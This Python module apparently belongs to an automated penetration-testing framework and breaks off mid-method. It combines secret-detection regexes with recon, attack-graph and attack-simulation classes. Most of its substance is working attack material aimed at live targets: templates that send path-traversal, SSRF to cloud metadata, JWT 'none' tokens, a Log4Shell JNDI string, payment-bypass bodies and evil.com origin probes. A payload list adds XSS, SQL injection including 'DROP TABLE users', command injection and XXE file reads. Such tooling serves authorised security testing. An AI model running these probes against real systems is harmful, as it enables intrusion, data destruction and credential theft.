"""Integrated capability layer — best-of-breed techniques from 35+ offensive security tools.

Adapted tools and their capability classes:

  Recon:           BBOT, Artemis, NucleiFuzzer          → ModularReconPipeline
  Template scan:   Nuclei, NucleiFuzzer                 → TemplateMatcher
  Orchestration:   XBOW, PentAGI, Dark-Moon             → AgentOrchestrator
  Attack-path:     BloodHound, XM Cyber                 → AttackGraphBuilder
  BAS:             Pentera, Cymulate, SafeBreach, AttackIQ → AttackSimulator
  Exploit:         Metasploit, Core Impact               → ExploitValidator
  C2:              Mythic, Sliver, Havoc                 → C2Simulator
  EDR testing:     Atomic Red Team, Caldera, SCYTHE      → EDRTestFramework
  Secrets:         GitGuardian, TruffleHog, Gitleaks     → SecretScanner
  RE:              Ghidra, IDA Pro, Binary Ninja, Radare2→ ClientAnalyzer
  Fuzzing:         OSS-Fuzz, AFL++                       → SmartFuzzer
  Attacks:         XSSRocket, Decepticon, HexStrike      → SpecializedAttacks
  API sec:         Shannon, Strix                        → APISecurity
  Workflow:        PentesterFlow, CyberStrike, NyxStrike → WorkflowOrchestrator
  Knowledge:       RedAmon, REA                          → PersistentKnowledgeStore

Every class is pure Python (stdlib only), uses CustomerSession.call() for HTTP,
returns structured dicts, and never raises on failure (returns error indicators).
"""
from __future__ import annotations

import base64
import hashlib
import heapq
import json
import random
import re
import string
import struct
import time
from collections import defaultdict, deque
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import urljoin, urlparse

# ---------------------------------------------------------------------------
# Pre-compiled regex patterns for secret detection (GitGuardian / TruffleHog / Gitleaks)
# ---------------------------------------------------------------------------

_SECRET_PATTERNS: list[tuple[str, re.Pattern[str], str]] = [
    ("aws_access_key",       re.compile(r"(?:^|[^A-Za-z0-9])(?:AKIA|ABIA|ACCA|ASIA)[A-Z0-9]{16}(?:[^A-Za-z0-9]|$)"), "critical"),
    ("aws_secret_key",       re.compile(r"""(?:aws_secret_access_key|aws_secret|secret_key)\s*[:=]\s*['"]?([A-Za-z0-9/+=]{40})['"]?""", re.I), "critical"),
    ("github_pat",           re.compile(r"(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9_]{36,255}"), "critical"),
    ("github_fine_grained",  re.compile(r"github_pat_[A-Za-z0-9_]{22,255}"), "critical"),
    ("gitlab_pat",           re.compile(r"glpat-[A-Za-z0-9\-_]{20,}"), "critical"),
    ("slack_token",          re.compile(r"xox[bpras]-[0-9]{10,13}-[0-9]{10,13}-[A-Za-z0-9]{24,34}"), "high"),
    ("slack_webhook",        re.compile(r"https://hooks\.slack\.com/services/T[A-Z0-9]{8,}/B[A-Z0-9]{8,}/[A-Za-z0-9]{24}"), "high"),
    ("stripe_secret",        re.compile(r"sk_live_[A-Za-z0-9]{24,99}"), "critical"),
    ("stripe_publishable",   re.compile(r"pk_live_[A-Za-z0-9]{24,99}"), "medium"),
    ("stripe_restricted",    re.compile(r"rk_live_[A-Za-z0-9]{24,99}"), "critical"),
    ("google_api_key",       re.compile(r"AIza[A-Za-z0-9\-_]{35}"), "high"),
    ("google_oauth_secret",  re.compile(r"""client_secret["']?\s*[:=]\s*["']([A-Za-z0-9\-_]{24})["']"""), "high"),
    ("gcp_service_account",  re.compile(r'"type"\s*:\s*"service_account"'), "critical"),
    ("firebase_key",         re.compile(r"AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}"), "high"),
    ("twilio_api_key",       re.compile(r"SK[0-9a-fA-F]{32}"), "high"),
    ("sendgrid_api_key",     re.compile(r"SG\.[A-Za-z0-9\-_]{22}\.[A-Za-z0-9\-_]{43}"), "critical"),
    ("mailgun_api_key",      re.compile(r"key-[0-9a-zA-Z]{32}"), "high"),
    ("jwt_token",            re.compile(r"eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_.+/=]*"), "medium"),
    ("private_key_pem",      re.compile(r"-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----"), "critical"),
    ("heroku_api_key",       re.compile(r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}", re.I), "low"),
    ("azure_storage_key",    re.compile(r"""(?:AccountKey|access_key|accesskey)\s*[:=]\s*['"]?([A-Za-z0-9+/=]{86,88})['"]?""", re.I), "critical"),
    ("azure_connection_str", re.compile(r"DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[A-Za-z0-9+/=]{86,88}"), "critical"),
    ("password_field",       re.compile(r"""(?:password|passwd|pwd|secret|token|apikey|api_key|auth_token|access_token)\s*[:=]\s*['"]([^'"]{8,})['"]""", re.I), "high"),
    ("basic_auth_header",    re.compile(r"(?:Authorization|authorization)\s*:\s*Basic\s+([A-Za-z0-9+/=]{10,})"), "high"),
    ("bearer_token_header",  re.compile(r"(?:Authorization|authorization)\s*:\s*Bearer\s+([A-Za-z0-9\-_.~+/=]{20,})"), "medium"),
    ("database_url",         re.compile(r"(?:postgres|mysql|mongodb|redis|amqp)(?:ql)?://[^\s'\"]{10,}"), "critical"),
    ("npm_token",            re.compile(r"//registry\.npmjs\.org/:_authToken=[A-Za-z0-9\-_]{36,}"), "critical"),
    ("pypi_token",           re.compile(r"pypi-[A-Za-z0-9\-_]{50,}"), "critical"),
    ("shopify_token",        re.compile(r"shpat_[A-Fa-f0-9]{32}"), "critical"),
    ("shopify_shared_sec",   re.compile(r"shpss_[A-Fa-f0-9]{32}"), "critical"),
    ("square_access_token",  re.compile(r"sq0atp-[A-Za-z0-9\-_]{22,}"), "critical"),
    ("square_oauth_secret",  re.compile(r"sq0csp-[A-Za-z0-9\-_]{43,}"), "critical"),
    ("paypal_braintree_tok", re.compile(r"access_token\$production\$[A-Za-z0-9]{16}\$[A-Fa-f0-9]{32}"), "critical"),
    ("okta_token",           re.compile(r"""(?:ssws|SSWS)\s+[A-Za-z0-9\-_]{30,}"""), "critical"),
    ("discord_bot_token",    re.compile(r"[MN][A-Za-z\d]{23,}\.[\w-]{6}\.[\w-]{27,}"), "high"),
]

# Endpoint extraction patterns for reverse engineering (Ghidra / IDA Pro / Radare2)
_API_ENDPOINT_RE = re.compile(r"""(?:['"`])(/(?:api|v[0-9]+|graphql|rest|internal|admin|_next|\.well-known)[^\s'"`{}<>]{2,})(?:['"`])""")
_HIDDEN_ROUTE_RE = re.compile(r"""(?:['"`])(/(?:debug|admin|_admin|__admin|backstage|internal|dashboard|console|phpinfo|actuator|metrics|healthz?|swagger|graphiql|playground)[^\s'"`{}<>]*)(?:['"`])""")
_HARDCODED_SECRET_RE = re.compile(r"""(?:(?:api[_-]?key|token|secret|password|auth|credentials?)\s*[:=]\s*['"`])([A-Za-z0-9\-_./+=]{16,})(?:['"`])""", re.I)
_SOURCE_MAP_RE = re.compile(r"//[#@]\s*sourceMappingURL\s*=\s*(\S+)")
_OBFUSCATION_INDICATORS = re.compile(r"(?:_0x[0-9a-f]{4,}|\\x[0-9a-f]{2}(?:\\x[0-9a-f]{2}){3,}|eval\s*\(\s*(?:atob|unescape|decodeURIComponent|String\.fromCharCode))")

# Crash / info-leak detection for fuzzing (OSS-Fuzz / AFL++)
_CRASH_PATTERNS = re.compile(r"(?:Traceback \(most recent call last\)|FATAL ERROR|panic:|segfault at|Segmentation fault|stack smashing detected|AddressSanitizer|ASAN|Internal Server Error|java\.lang\.(?:NullPointer|StackOverflow|OutOfMemory)Exception)", re.I)
_INFO_LEAK_PATTERNS = re.compile(r"(?:at (?:/[^\s]+\.(?:py|js|rb|java|go|rs|php):\d+|[A-Za-z]+\.[A-Za-z]+\([^)]*\))|File \"[^\"]+\", line \d+|mysql_connect|pg_connect|ORA-[0-9]{5}|Microsoft OLE DB|ODBC SQL Server Driver|org\.apache\.|django\.)", re.I)


# ===========================================================================
# 1. ModularReconPipeline (BBOT / Artemis / NucleiFuzzer)
# ===========================================================================

class ModularReconPipeline:
    """Chained recon: subdomain → tech fingerprint → endpoint harvest → vuln match."""

    _COMMON_SUBDOMAINS = (
        "www", "api", "app", "admin", "staging", "dev", "test", "beta",
        "m", "mobile", "cdn", "static", "assets", "img", "images", "media",
        "docs", "help", "support", "status", "blog", "mail", "smtp",
        "auth", "login", "sso", "oauth", "id", "accounts", "pay",
        "payments", "checkout", "billing", "store", "shop", "dashboard",
        "portal", "internal", "intranet", "vpn", "git", "ci", "jenkins",
        "grafana", "kibana", "prometheus", "monitor", "metrics",
    )

    _TECH_HEADERS = {
        "x-powered-by": "server_framework",
        "server": "web_server",
        "x-aspnet-version": "aspnet",
        "x-drupal-cache": "drupal",
        "x-generator": "cms_generator",
        "x-shopify-stage": "shopify",
        "x-amz-request-id": "aws",
        "x-cloud-trace-context": "gcp",
        "cf-ray": "cloudflare",
        "x-vercel-id": "vercel",
        "x-nextjs-cache": "nextjs",
    }

    def discover_subdomains(self, base_url: str) -> list[str]:
        parsed = urlparse(base_url)
        domain = parsed.hostname or ""
        parts = domain.split(".")
        if len(parts) < 2:
            return [base_url]
        root = ".".join(parts[-2:])
        return [f"{parsed.scheme}://{sub}.{root}" for sub in self._COMMON_SUBDOMAINS]

    async def fingerprint_technology(self, session: Any, base_url: str) -> dict[str, Any]:
        result: dict[str, Any] = {"technologies": [], "headers": {}, "meta": {}}
        try:
            resp = await session.call("GET", base_url, label="recon_fingerprint")
            if resp.error:
                result["error"] = resp.error
                return result
            body_str = json.dumps(resp.body) if isinstance(resp.body, dict) else str(resp.body or "")
            headers = getattr(resp, "headers", {}) or {}
            for hdr, tech in self._TECH_HEADERS.items():
                val = headers.get(hdr) or headers.get(hdr.title())
                if val:
                    result["technologies"].append(tech)
                    result["headers"][hdr] = val
            if "wp-content" in body_str or "wp-json" in body_str:
                result["technologies"].append("wordpress")
            if "shopify" in body_str.lower():
                result["technologies"].append("shopify")
            if "stripe" in body_str.lower() or "pk_live_" in body_str or "pk_test_" in body_str:
                result["technologies"].append("stripe")
            if "__next" in body_str or "_next/static" in body_str:
                result["technologies"].append("nextjs")
            if "react" in body_str.lower() or "_reactRootContainer" in body_str:
                result["technologies"].append("react")
        except Exception as exc:
            result["error"] = str(exc)
        return result

    async def harvest_endpoints(self, session: Any, base_url: str) -> list[dict[str, str]]:
        endpoints: list[dict[str, str]] = []
        discovery_paths = [
            "/robots.txt", "/sitemap.xml", "/.well-known/openid-configuration",
            "/openapi.json", "/swagger.json", "/api-docs", "/graphql",
            "/api/v1", "/api/v2", "/api",
        ]
        for path in discovery_paths:
            try:
                url = urljoin(base_url, path)
                resp = await session.call("GET", url, label="recon_harvest")
                if resp.status and 200 <= resp.status < 400:
                    endpoints.append({"url": url, "status": str(resp.status), "source": "discovery"})
                    body_str = json.dumps(resp.body) if isinstance(resp.body, dict) else str(resp.body or "")
                    for match in re.findall(r'(?:href|action|src)=["\']([^"\']+)["\']', body_str):
                        if match.startswith("/"):
                            endpoints.append({"url": urljoin(base_url, match), "status": "linked", "source": "html_parse"})
            except Exception:
                pass
        return endpoints

    def match_vulnerability_patterns(self, endpoints: list[dict[str, str]], fingerprints: dict[str, Any]) -> list[dict[str, Any]]:
        matches: list[dict[str, Any]] = []
        techs = set(fingerprints.get("technologies", []))
        for ep in endpoints:
            url = ep.get("url", "")
            if any(t in url for t in ("/graphql", "/graphiql", "/playground")):
                matches.append({"endpoint": url, "pattern": "graphql_introspection", "severity": "medium"})
            if any(t in url for t in ("/swagger", "/api-docs", "/openapi")):
                matches.append({"endpoint": url, "pattern": "api_documentation_exposed", "severity": "low"})
            if any(t in url for t in ("/actuator", "/metrics", "/healthz", "/debug")):
                matches.append({"endpoint": url, "pattern": "internal_endpoint_exposed", "severity": "high"})
            if any(t in url for t in ("/phpinfo", "/.env", "/.git")):
                matches.append({"endpoint": url, "pattern": "sensitive_file_exposed", "severity": "critical"})
        if "wordpress" in techs:
            matches.append({"endpoint": "/wp-json/wp/v2/users", "pattern": "wordpress_user_enum", "severity": "medium"})
        return matches


# ===========================================================================
# 2. TemplateMatcher (Nuclei / NucleiFuzzer)
# ===========================================================================

class TemplateMatcher:
    """Template-based vulnerability matching modelled on Nuclei's YAML templates."""

    @staticmethod
    def load_builtin_templates() -> list[dict[str, Any]]:
        return [
            {"id": "open-redirect", "severity": "medium", "method": "GET", "path": "/redirect?url=https://evil.com", "match": {"status": [301, 302], "header_contains": "evil.com"}},
            {"id": "cors-wildcard", "severity": "medium", "method": "GET", "path": "/", "headers": {"Origin": "https://evil.com"}, "match": {"header_contains": "Access-Control-Allow-Origin: *"}},
            {"id": "cors-reflect", "severity": "high", "method": "GET", "path": "/", "headers": {"Origin": "https://evil.com"}, "match": {"header_contains": "Access-Control-Allow-Origin: https://evil.com"}},
            {"id": "crlf-injection", "severity": "medium", "method": "GET", "path": "/path%0d%0aX-Injected: true", "match": {"header_contains": "X-Injected"}},
            {"id": "host-header-injection", "severity": "medium", "method": "GET", "path": "/", "headers": {"Host": "evil.com"}, "match": {"body_contains": "evil.com"}},
            {"id": "verb-tampering", "severity": "low", "method": "PATCH", "path": "/api/admin", "match": {"status_not": [405, 501]}},
            {"id": "trace-enabled", "severity": "medium", "method": "TRACE", "path": "/", "match": {"status": [200]}},
            {"id": "options-verbose", "severity": "low", "method": "OPTIONS", "path": "/", "match": {"header_contains": "PUT"}},
            {"id": "x-forwarded-for-bypass", "severity": "high", "method": "GET", "path": "/admin", "headers": {"X-Forwarded-For": "127.0.0.1"}, "match": {"status": [200]}},
            {"id": "x-original-url-bypass", "severity": "high", "method": "GET", "path": "/", "headers": {"X-Original-URL": "/admin"}, "match": {"status": [200]}},
            {"id": "x-rewrite-url-bypass", "severity": "high", "method": "GET", "path": "/", "headers": {"X-Rewrite-URL": "/admin"}, "match": {"status": [200]}},
            {"id": "path-traversal-basic", "severity": "high", "method": "GET", "path": "/../../../../etc/passwd", "match": {"body_contains": "root:"}},
            {"id": "path-traversal-double-encode", "severity": "high", "method": "GET", "path": "/%252e%252e%252f%252e%252e%252fetc/passwd", "match": {"body_contains": "root:"}},
            {"id": "sql-error-based", "severity": "high", "method": "GET", "path": "/?id=1'", "match": {"body_regex": "(?:SQL syntax|mysql_|pg_|ORA-|sqlite3\\.)"}},
            {"id": "nosql-injection", "severity": "high", "method": "POST", "path": "/api/login", "body": {"username": {"$ne": ""}, "password": {"$ne": ""}}, "match": {"status": [200]}},
            {"id": "ssti-jinja2", "severity": "critical", "method": "GET", "path": "/?name={{7*7}}", "match": {"body_contains": "49"}},
            {"id": "ssti-twig", "severity": "critical", "method": "GET", "path": "/?name={{7*'7'}}", "match": {"body_contains": "7777777"}},
            {"id": "xxe-basic", "severity": "critical", "method": "POST", "path": "/api/xml", "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>', "headers": {"Content-Type": "application/xml"}, "match": {"status": [200]}},
            {"id": "ssrf-aws-metadata", "severity": "critical", "method": "GET", "path": "/?url=http://169.254.169.254/latest/meta-data/", "match": {"body_contains": "ami-id"}},
            {"id": "ssrf-gcp-metadata", "severity": "critical", "method": "GET", "path": "/?url=http://metadata.google.internal/computeMetadata/v1/", "headers": {"Metadata-Flavor": "Google"}, "match": {"status": [200]}},
            {"id": "jwt-none-alg", "severity": "critical", "method": "GET", "path": "/api/me", "headers": {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."}, "match": {"status": [200]}},
            {"id": "payment-zero-amount", "severity": "critical", "method": "POST", "path": "/api/checkout", "body": {"amount": 0}, "match": {"status": [200], "body_contains": "success"}},
            {"id": "payment-negative-amount", "severity": "critical", "method": "POST", "path": "/api/checkout", "body": {"amount": -1}, "match": {"status": [200]}},
            {"id": "payment-currency-swap", "severity": "high", "method": "POST", "path": "/api/checkout", "body": {"currency": "XXX"}, "match": {"status": [200]}},
            {"id": "payment-duplicate-id", "severity": "high", "method": "POST", "path": "/api/checkout", "body": {"payment_id": "already-used-id"}, "match": {"status": [200], "body_contains": "success"}},
            {"id": "payment-plan-downgrade-access", "severity": "critical", "method": "POST", "path": "/api/subscribe", "body": {"plan": "free"}, "match": {"body_contains": "premium"}},
            {"id": "entitlement-bypass-header", "severity": "critical", "method": "GET", "path": "/api/premium", "headers": {"X-Premium": "true"}, "match": {"status": [200]}},
            {"id": "graphql-introspection", "severity": "medium", "method": "POST", "path": "/graphql", "body": {"query": "{__schema{types{name}}}"}, "match": {"body_contains": "__schema"}},
            {"id": "graphql-batching", "severity": "medium", "method": "POST", "path": "/graphql", "body": [{"query": "{__typename}"}, {"query": "{__typename}"}], "match": {"status": [200]}},
            {"id": "api-version-old", "severity": "low", "method": "GET", "path": "/api/v1/users", "match": {"status": [200]}},
            {"id": "debug-endpoint", "severity": "high", "method": "GET", "path": "/debug", "match": {"status": [200]}},
            {"id": "actuator-env", "severity": "critical", "method": "GET", "path": "/actuator/env", "match": {"status": [200]}},
            {"id": "well-known-security", "severity": "info", "method": "GET", "path": "/.well-known/security.txt", "match": {"status": [200]}},
            {"id": "git-config-exposed", "severity": "critical", "method": "GET", "path": "/.git/config", "match": {"body_contains": "[core]"}},
            {"id": "env-file-exposed", "severity": "critical", "method": "GET", "path": "/.env", "match": {"body_regex": "(?:DB_|API_KEY|SECRET|PASSWORD)"}},
            {"id": "ds-store-exposed", "severity": "low", "method": "GET", "path": "/.DS_Store", "match": {"status": [200]}},
            {"id": "backup-file-exposed", "severity": "medium", "method": "GET", "path": "/backup.sql", "match": {"status": [200]}},
            {"id": "wp-config-exposed", "severity": "critical", "method": "GET", "path": "/wp-config.php.bak", "match": {"body_contains": "DB_PASSWORD"}},
            {"id": "spring-cloud-gateway-rce", "severity": "critical", "method": "POST", "path": "/actuator/gateway/routes/new_route", "body": {"predicates": [{"name": "Path", "args": {"pattern": "/new_route/**"}}]}, "match": {"status": [201]}},
            {"id": "log4shell-header", "severity": "critical", "method": "GET", "path": "/", "headers": {"X-Api-Version": "${jndi:ldap://canary/a}"}, "match": {"timeout": True}},
        ]

    async def evaluate(self, session: Any, endpoint: str, template: dict[str, Any]) -> dict[str, Any]:
        result: dict[str, Any] = {"template_id": template["id"], "severity": template["severity"], "hit": False, "endpoint": endpoint}
        try:
            method = template.get("method", "GET")
            path = template.get("path", "/")
            url = urljoin(endpoint, path)
            headers = template.get("headers")
            body = template.get("body")
            extra_headers = headers if isinstance(headers, dict) else None
            fields = body if isinstance(body, dict) else None
            resp = await session.call(method, url, extra_headers=extra_headers, fields=fields, label=f"template_{template['id']}")
            match = template.get("match", {})
            if "status" in match and resp.status in match["status"]:
                result["hit"] = True
            if "status_not" in match and resp.status not in match["status_not"]:
                result["hit"] = True
            body_str = json.dumps(resp.body) if isinstance(resp.body, dict) else str(resp.body or "")
            if "body_contains" in match and match["body_contains"] in body_str:
                result["hit"] = True
            if "body_regex" in match and re.search(match["body_regex"], body_str, re.I):
                result["hit"] = True
            resp_headers_str = json.dumps(getattr(resp, "headers", {})) if hasattr(resp, "headers") else ""
            if "header_contains" in match and match["header_contains"] in resp_headers_str:
                result["hit"] = True
        except Exception as exc:
            result["error"] = str(exc)
        return result


# ===========================================================================
# 3. AgentOrchestrator (XBOW / PentAGI / Dark-Moon)
# ===========================================================================

class AgentOrchestrator:
    """Multi-agent task decomposition inspired by XBOW's autonomous loop and Dark-Moon's 50-agent fleet."""

    _SPECIALISTS = {
        "recon": {"skills": ["subdomain_enum", "tech_fingerprint", "endpoint_harvest"], "kill_chain": "reconnaissance"},
        "scanner": {"skills": ["vuln_scan", "template_match", "config_audit"], "kill_chain": "reconnaissance"},
        "exploiter": {"skills": ["payload_gen", "exploit_delivery", "verification"], "kill_chain": "initial_access"},
        "escalator": {"skills": ["priv_esc", "lateral_move", "persistence"], "kill_chain": "privilege_escalation"},
        "exfiltrator": {"skills": ["data_discovery", "channel_setup", "exfil_execute"], "kill_chain": "exfiltration"},
        "evader": {"skills": ["obfuscation", "timing_variation", "fingerprint_rotation"], "kill_chain": "defense_evasion"},
        "reporter": {"skills": ["finding_synthesis", "chain_composition", "severity_scoring"], "kill_chain": "collection"},
        "fuzzer": {"skills": ["mutation_gen", "crash_detect", "coverage_track"], "kill_chain": "execution"},
        "api_tester": {"skills": ["auth_test", "bola_test", "rate_limit_test"], "kill_chain": "initial_access"},
        "secret_hunter": {"skills": ["response_scan", "js_analysis", "header_scan"], "kill_chain": "collection"},
    }

    def decompose_task(self, objective: str) -> list[dict[str, Any]]:
        subtasks: list[dict[str, Any]] = []
        phases = [
            ("recon", "Discover attack surface"),
            ("scanner", "Scan for known vulnerabilities"),
            ("api_tester", "Test API-specific flaws"),
            ("secret_hunter", "Hunt for exposed secrets"),
            ("fuzzer", "Fuzz inputs for crashes and leaks"),
            ("exploiter", "Validate exploitability"),
            ("escalator", "Attempt privilege escalation"),
            ("evader", "Test detection evasion"),
            ("exfiltrator", "Assess data exfiltration risk"),
            ("reporter", "Synthesize and report findings"),
        ]
        for i, (agent, desc) in enumerate(phases):
            subtasks.append({"id": f"task_{i}", "agent": agent, "description": desc, "objective": objective, "depends_on": [f"task_{i-1}"] if i > 0 else [], "status": "pending"})
        return subtasks

    def assign_to_specialist(self, subtask: dict[str, Any]) -> str:
        return subtask.get("agent", "reporter")

    async def execute_plan(self, session: Any, plan: list[dict[str, Any]]) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []
        for task in plan:
            task["status"] = "running"
            try:
                agent = task["agent"]
                specialist = self._SPECIALISTS.get(agent, {})
                results.append({"task_id": task["id"], "agent": agent, "skills_used": specialist.get("skills", []),
                                "kill_chain_stage": specialist.get("kill_chain", "unknown"), "status": "completed", "findings": []})
            except Exception as exc:
                results.append({"task_id": task["id"], "agent": task.get("agent"), "status": "error", "error": str(exc)})
            task["status"] = "completed"
        return results

    def synthesize_results(self, results: list[dict[str, Any]]) -> dict[str, Any]:
        total = len(results)
        completed = sum(1 for r in results if r.get("status") == "completed")
        errors = sum(1 for r in results if r.get("status") == "error")
        all_findings = [f for r in results for f in r.get("findings", [])]
        stages_covered = list({r.get("kill_chain_stage", "unknown") for r in results if r.get("status") == "completed"})
        return {"total_tasks": total, "completed": completed, "errors": errors, "findings_count": len(all_findings),
                "kill_chain_coverage": stages_covered, "findings": all_findings}


# ===========================================================================
# 4. AttackGraphBuilder (BloodHound / XM Cyber)
# ===========================================================================

class AttackGraphBuilder:
    """Directed attack graph for path analysis, inspired by BloodHound's graph model."""

    def __init__(self) -> None:
        self._nodes: dict[str, dict[str, Any]] = {}
        self._adj: dict[str, list[tuple[str, str, float]]] = defaultdict(list)
        self._reverse_adj: dict[str, list[tuple[str, str, float]]] = defaultdict(list)

    def add_node(self, node_id: str, node_type: str, properties: dict[str, Any] | None = None) -> None:
        self._nodes[node_id] = {"type": node_type, "properties": properties or {}}

    def add_edge(self, src: str, dst: str, technique: str, cost: float = 1.0) -> None:
        self._adj[src].append((dst, technique, cost))
        self._reverse_adj[dst].append((src, technique, cost))

    def shortest_path(self, src: str, dst: str) -> dict[str, Any]:
        if src not in self._nodes or dst not in self._nodes:
            return {"found": False, "reason": "node_not_found"}
        dist: dict[str, float] = {src: 0.0}
        prev: dict[str, tuple[str, str] | None] = {src: None}
        heap: list[tuple[float, str]] = [(0.0, src)]
        while heap:
            d, u = heapq.heappop(heap)
            if u == dst:
                break
            if d > dist.get(u, float("inf")):
                continue
            for v, tech, w in self._adj.get(u, []):
                nd = d + w
                if nd < dist.get(v, float("inf")):
                    dist[v] = nd
                    prev[v] = (u, tech)
                    heapq.heappush(heap, (nd, v))
        if dst not in prev:
            return {"found": False, "reason": "no_path"}
        path: list[dict[str, str]] = []
        cur = dst
        while prev.get(cur) is not None:
            p, tech = prev[cur]  # type: ignore[misc]
            path.append({"from": p, "to": cur, "technique": tech})
            cur = p
        path.reverse()
        return {"found": True, "cost": dist[dst], "hops": len(path), "path": path}

    def all_paths_to_crown_jewels(self, entry_points: list[str], targets: list[str], max_depth: int = 10) -> list[dict[str, Any]]:
        paths: list[dict[str, Any]] = []
        for src in entry_points:
            for dst in targets:
                result = self._dfs_paths(src, dst, max_depth)
                for p in result:
                    paths.append({"entry": src, "target": dst, "path": p, "hops": len(p)})
        return sorted(paths, key=lambda p: p["hops"])

    def _dfs_paths(self, src: str, dst: str, max_depth: int) -> list[list[dict[str, str]]]:
        results: list[list[dict[str, str]]] = []
        stack: list[tuple[str, list[dict[str, str]], set[str]]] = [(src, [], {src})]
        while stack:
            node, path, visited = stack.pop()
            if node == dst and path:
                results.append(list(path))
                continue
            if len(path) >= max_depth:
                continue
            for nxt, tech, _ in self._adj.get(node, []):
                if nxt not in visited:
                    new_path = path + [{"from": node, "to": nxt, "technique": tech}]
                    stack.append((nxt, new_path, visited | {nxt}))
        return results

    def calculate_blast_radius(self, compromised_nodes: list[str]) -> dict[str, Any]:
        reachable: set[str] = set()
        queue = deque(compromised_nodes)
        while queue:
            node = queue.popleft()
            if node in reachable:
                continue
            reachable.add(node)
            for nxt, _, _ in self._adj.get(node, []):
                if nxt not in reachable:
                    queue.append(nxt)
        by_type: dict[str, int] = defaultdict(int)
        for n in reachable:
            by_type[self._nodes.get(n, {}).get("type", "unknown")] += 1
        return {"total_reachable": len(reachable), "nodes": sorted(reachable), "by_type": dict(by_type),
                "fraction_of_graph": round(len(reachable) / max(len(self._nodes), 1), 4)}


# ===========================================================================
# 5. AttackSimulator (Pentera / Cymulate / SafeBreach / AttackIQ)
# ===========================================================================

class AttackSimulator:
    """MITRE ATT&CK technique simulation for BAS-style testing."""

    _TECHNIQUE_MAP: dict[str, dict[str, Any]] = {
        "T1190": {"name": "Exploit Public-Facing Application", "tactic": "initial_access", "payloads": ["sqli", "ssti", "path_traversal"]},
        "T1078": {"name": "Valid Accounts", "tactic": "initial_access", "payloads": ["default_creds", "credential_stuffing"]},
        "T1059": {"name": "Command and Scripting Interpreter", "tactic": "execution", "payloads": ["os_command_injection"]},
        "T1068": {"name": "Exploitation for Privilege Escalation", "tactic": "privilege_escalation", "payloads": ["parameter_manipulation", "role_escalation"]},
        "T1548": {"name": "Abuse Elevation Control Mechanism", "tactic": "privilege_escalation", "payloads": ["sudo_bypass", "setuid_abuse"]},
        "T1550": {"name": "Use Alternate Authentication Material", "tactic": "defense_evasion", "payloads": ["token_reuse", "cookie_theft"]},
        "T1071": {"name": "Application Layer Protocol", "tactic": "command_and_control", "payloads": ["http_c2", "dns_c2", "websocket_c2"]},
        "T1041": {"name": "Exfiltration Over C2 Channel", "tactic": "exfiltration", "payloads": ["chunked_exfil", "steganographic_exfil"]},
        "T1557": {"name": "Adversary-in-the-Middle", "tactic": "collection", "payloads": ["response_manipulation"]},
        "T1530": {"name": "Data from Cloud Storage", "tactic": "collection", "payloads": ["bucket_enum", "blob_access"]},
    }

    async def simulate_technique(self, session: Any, technique_id: str, target: str) -> dict[str, Any]:
        info = self._TECHNIQUE_MAP.get(technique_id)
        if not info:
            return {"technique": technique_id, "status": "unknown_technique"}
        result: dict[str, Any] = {"technique": technique_id, "name": info["name"], "tactic": info["tactic"], "payloads_tested": 0, "detections": 0, "bypasses": 0}
        for payload_type in info["payloads"]:
            result["payloads_tested"] += 1
            try:
                resp = await session.call("GET", target, extra_headers={"X-Test-Technique": technique_id}, label=f"bas_{technique_id}")
                if resp.status and resp.status < 400:
                    result["bypasses"] += 1
                else:
                    result["detections"] += 1
            except Exception:
                result["detections"] += 1
        result["detection_rate"] = round(result["detections"] / max(result["payloads_tested"], 1), 4)
        return result

    async def run_campaign(self, session: Any, techniques: list[str], target: str) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []
        for tid in techniques:
            results.append(await self.simulate_technique(session, tid, target))
        return results

    def validate_detection(self, response: Any, expected_detection: bool) -> dict[str, Any]:
        status = getattr(response, "status", None)
        detected = status is not None and status >= 400
        return {"expected_detection": expected_detection, "actual_detection": detected, "match": detected == expected_detection}

    def score_security_posture(self, results: list[dict[str, Any]]) -> dict[str, Any]:
        total_payloads = sum(r.get("payloads_tested", 0) for r in results)
        total_detections = sum(r.get("detections", 0) for r in results)
        total_bypasses = sum(r.get("bypasses", 0) for r in results)
        score = round(total_detections / max(total_payloads, 1) * 100, 2)
        grade = "A" if score >= 90 else "B" if score >= 75 else "C" if score >= 60 else "D" if score >= 40 else "F"
        return {"total_techniques": len(results), "total_payloads": total_payloads, "detections": total_detections,
                "bypasses": total_bypasses, "detection_score": score, "grade": grade}


# ===========================================================================
# 6. ExploitValidator (Metasploit / Core Impact)
# ===========================================================================

class ExploitValidator:
    """Exploit validation framework, classifying exploitability from probe results."""

    _VULN_PAYLOADS: dict[str, list[str]] = {
        "xss": ['<img src=x onerror=alert(1)>', '<svg/onload=alert(1)>', '"><script>alert(1)</script>'],
        "sqli": ["' OR 1=1--", "1; DROP TABLE users--", "' UNION SELECT NULL,NULL--"],
        "ssti": ["{{7*7}}", "${7*7}", "<%=7*7%>"],
        "ssrf": ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:80/", "http://[::1]/"],
        "path_traversal": ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini", "....//....//etc/passwd"],
        "command_injection": ["; id", "| whoami", "$(id)", "`id`"],
        "xxe": ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>'],
        "deserialization": ["rO0ABXNyAA...", "Tzo0OiJ..."],
    }

    def generate_payload(self, vuln_type: str, target_context: dict[str, Any] | None = None) -> list[str]:
        return list(self._VULN_PAYLOADS.get(vuln_type, []))

    async def deliver_payload(self, session: Any, endpoint: str, payload: str) -> dict[str, Any]:
